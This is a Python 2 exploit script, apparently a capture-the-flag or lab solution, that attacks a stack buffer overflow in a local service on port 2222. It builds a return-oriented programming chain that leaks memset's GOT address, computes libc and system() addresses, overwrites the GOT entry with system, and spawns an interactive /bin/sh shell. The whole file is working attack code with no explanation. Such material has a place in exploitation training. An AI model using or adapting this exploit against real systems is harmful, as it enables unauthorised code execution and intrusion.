#!/usr/bin/python
import sys
import telnetlib
from socket import *
from struct import *

#------------------------------------------------------
rop_gadget = 	0x400a45 	# pop rdi; pop rsi; pop rdx; ret;

read_plt = 		0x4007a0	# call   4007a0 <read@plt>

memset_plt = 	0x400780	# call   400780 <memset@plt>
memset_got = 	0x601048   	# 0000000000601048 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
memset_offset = 0x8e600		# 846: 000000000008e600    65 IFUNC   GLOBAL DEFAULT   13 memset@@GLIBC_2.2.5

write_plt = 	0x400730	# call   400730 <write@plt>
write_got = 	0x601020	# 0000000000601020 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5

system_offset = 0x45390		# 1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

writeable = 	0x601000
#[24] .got.plt          PROGBITS         0000000000601000  00001000
#       0000000000000090  0000000000000008  WA       0     0     8

#------------------------------------------------------
buf = ""
buf += "A"*168
buf += pack("<Q", rop_gadget)
buf += pack("<Q", 0x1)       # stdout
buf += pack("<Q", memset_got)# address to read
buf += pack("<Q", 0x8)       # number of bytes = 8 (address)
buf += pack("<Q", write_plt) # write to stdout
#------------------------------------------------------
buf += pack("<Q", rop_gadget)
buf += pack("<Q", 0x0)        # stdin
buf += pack("<Q", memset_got) # address to overwrite
buf += pack("<Q", 0x8)        # number of bytes = 8 (address)
buf += pack("<Q", read_plt)   # read from stdin and write to addr memset_got 
#------------------------------------------------------
buf += pack("<Q", rop_gadget)
buf += pack("<Q", 0x0)        # stdin
buf += pack("<Q", writeable)  # address to store "/bin/sh"
buf += pack("<Q", 0x8)        # number of bytes to read from stdin
buf += pack("<Q", read_plt)   # read from stdin "/bin/sh" 
#------------------------------------------------------
buf += pack("<Q", rop_gadget)
buf += pack("<Q", writeable)  # address of "/bin/sh"
buf += pack("<Q", 0x1)        # junk
buf += pack("<Q", 0x1)        # junk
buf += pack("<Q", memset_plt) # jump to memset = system
#------------------------------------------------------
s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 2222))
print "Received: ", s.recv(1000)				# "Enter input: "
print s.send(buf)
print "Received: ", s.recv(1000)				# "Recv: "
d = s.recv(1000)[-8:]

memset_addr_received = unpack("<Q", d)
memset_addr = memset_addr_received[0] - 0x90
print "memset() is at ", hex(memset_addr)

libc_addr = memset_addr - memset_offset
print "libc is at ", hex(libc_addr)

system_addr = libc_addr + system_offset
print "system is at ", hex(system_addr)

print "sending system address ", hex(system_addr)
s.send(pack("<Q",system_addr))

print "sending '/bin/sh'"
s.send("/bin/sh")

f = open("in.txt","w")
f.write(buf)
f.close()

t = telnetlib.Telnet()
t.sock = s
t.interact()
